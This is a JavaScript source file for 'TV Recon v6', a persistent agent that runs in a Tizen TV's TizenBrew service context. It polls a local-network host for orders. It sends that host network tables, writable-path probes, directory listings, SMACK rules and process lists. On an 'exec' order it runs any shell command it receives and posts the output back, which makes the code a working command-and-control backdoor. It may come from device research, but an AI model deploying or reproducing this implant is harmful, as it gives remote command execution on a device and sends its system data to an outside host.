/* TV Recon v6 — LONG-LIVED RESIDENT AGENT.
 * Runs in the TizenBrew service vm context. No crash markers, no throws —
 * a single resident module with a polling loop. Orders from /mode:
 *   {"action":"recon"}   light status posts
 *   {"action":"exec","cmd":"..."}   run command, post output
 *   {"action":"stop"}    idle (no posts)
 * ES5. Every callback wrapped — an async throw would kill the whole service. */
'use strict';

var MAC = '192.168.86.86';
var PORT = 8080;
var fs = require('fs');
var http = require('http');

var lastModeStr = '';
var busy = false;

function post(tag, data) {
    try {
        var body = JSON.stringify({ tag: tag, data: data });
        if (body.length > 400000) body = JSON.stringify({ tag: tag, data: '(too big)' });
        var req = http.request({
            host: MAC, port: PORT, path: '/report', method: 'POST',
            headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body) }
        });
        req.on('error', function () {});
        req.end(body);
    } catch (e) {}
}
function T(fn) { try { return fn(); } catch (e) { return 'ERR:' + (e && e.message ? e.message : String(e)); } }
function read(f, n) { return T(function () { return fs.readFileSync(f, 'utf8').slice(0, n || 6000); }); }
function ls(d) { return T(function () { return fs.readdirSync(d).slice(0, 250); }); }

console.log('TV Recon v6 resident agent starting');
post('v6-online', { time: new Date().toISOString(), uid: process.getuid(), node: process.version });

function getMode(cb) {
    try {
        var req = http.request({ host: MAC, port: PORT, path: '/mode', method: 'GET' }, function (res) {
            var b = '';
            res.on('data', function (c) { b += c; });
            res.on('end', function () {
                try { cb(JSON.parse(b)); } catch (e) { cb(null); }
            });
        });
        req.on('error', function () { cb(null); });
        req.end();
    } catch (e) { cb(null); }
}

var seenOnce = {};
function once(key, fn) { if (!seenOnce[key]) { seenOnce[key] = true; fn(); } }

function doRecon(mode) {
    /* one-time full map (delivered once per service lifetime), then light status */
    once('net', function () {
        post('net-unix', read('/proc/net/unix', 12000));
        post('net-tcp', read('/proc/net/tcp', 6000));
        post('net-udp', read('/proc/net/udp', 3000));
    });
    once('writable', function () {
        var wr = {};
        ['/tmp', '/home/owner/share/tmp/sdk_tools', '/home/owner/share/tmp', '/home/owner',
         '/dev/shm', '/run/user/5001', '/opt/usr/home/owner', '/home/owner/data',
         '/home/owner/content', '/home/owner/.cache', '/home/owner/apps_rw'].forEach(function (d) {
            wr[d] = T(function () { var t = d + '/.__tvr'; fs.writeFileSync(t, '1'); fs.unlinkSync(t); return 'WRITE_OK'; });
        });
        post('writable', wr);
    });
    once('dirs', function () {
        ['/opt/etc', '/usr/share/chromium-efl/upgrade', '/var', '/usr/lib/systemd/system',
         '/etc/systemd/system', '/run/user/5001', '/opt/usr/apps/xvvl3S1bvH',
         '/opt/usr/apps', '/var/cynara', '/var/lib', '/etc/sysmgr'].forEach(function (d) {
            post('fs', { dir: d, listing: ls(d) });
        });
    });
    once('smack', function () {
        post('smack-load2', read('/sys/fs/smackfs/load2', 16000));
    });
    if (mode.deep) {
        /* full procmap only on demand */
        once('procmap', function () {
            var pids = T(function () { return fs.readdirSync('/proc').filter(function (x) { return /^[0-9]+$/.test(x); }); });
            var procs = [];
            if (pids instanceof Array) {
                for (var k = 0; k < pids.length; k++) {
                    var pid = pids[k];
                    var s = T(function () { return fs.readFileSync('/proc/' + pid + '/status', 'utf8'); });
                    if (typeof s !== 'string') continue;
                    var name = (s.match(/^Name:\s*(.*)/m) || [0, '?'])[1];
                    var uid = (s.match(/^Uid:\s*(\d+)/m) || [0, '?'])[1];
                    if (uid !== '0' && uid !== '5001') continue;
                    if (name && /^(kworker|migration|ksoftirqd|watchdog|rcu_|kthrotld|irq|mmc_|scsi_|zswap|loop|nfit|bioset|kblockd)/.test(name)) continue;
                    var cmd = T(function () { return fs.readFileSync('/proc/' + pid + '/cmdline', 'utf8').replace(/\0/g, ' ').slice(0, 130); });
                    procs.push({ pid: pid, name: name, uid: uid, cmd: cmd });
                    if (procs.length >= 220) break;
                }
            }
            for (var c = 0; c < procs.length; c += 25) {
                post('procs', { chunk: c / 25, total: procs.length, list: procs.slice(c, c + 25) });
            }
        });
    }
    post('heartbeat', { t: new Date().toISOString(), busy: busy });
}

function doExec(mode) {
    if (busy) { post('exec-busy', true); return; }
    busy = true;
    try {
        var cp = require('child_process');
        post('exec-start', { cmd: mode.cmd });
        cp.exec(mode.cmd, { timeout: 20000, maxBuffer: 600000 }, function (err, stdout, stderr) {
            try {
                var out = String(stdout || '');
                var errS = String(stderr || '');
                var CH = 3500, i;
                for (i = 0; i < out.length; i += CH) post('exec-out', { i: i / CH, s: out.slice(i, i + CH) });
                for (i = 0; i < errS.length; i += CH) post('exec-err', { i: i / CH, s: errS.slice(i, i + CH) });
                post('exec-done', {
                    rc: err ? (err.code !== undefined ? err.code : String(err)) : 0,
                    outLen: out.length, errLen: errS.length
                });
            } catch (e) { post('exec-post-fail', String(e)); }
            busy = false;
        });
    } catch (e) {
        post('exec-fail', String(e));
        busy = false;
    }
}

function tick() {
    try {
        getMode(function (mode) {
            try {
                if (!mode || !mode.action) { mode = { action: 'recon' }; }
                var ms = JSON.stringify(mode);
                if (ms !== lastModeStr) {
                    lastModeStr = ms;
                    post('mode', mode);
                }
                if (mode.action === 'exec') doExec(mode);
                else if (mode.action === 'stop') { /* idle */ }
                else doRecon(mode);
            } catch (e) { post('tick-err', String(e)); }
            setTimeout(tick, 5000);
        });
    } catch (e) {
        try { post('tick-outer-err', String(e)); } catch (e2) {}
        setTimeout(tick, 5000);
    }
}
tick();

/* keep the vm context alive forever — never throw */
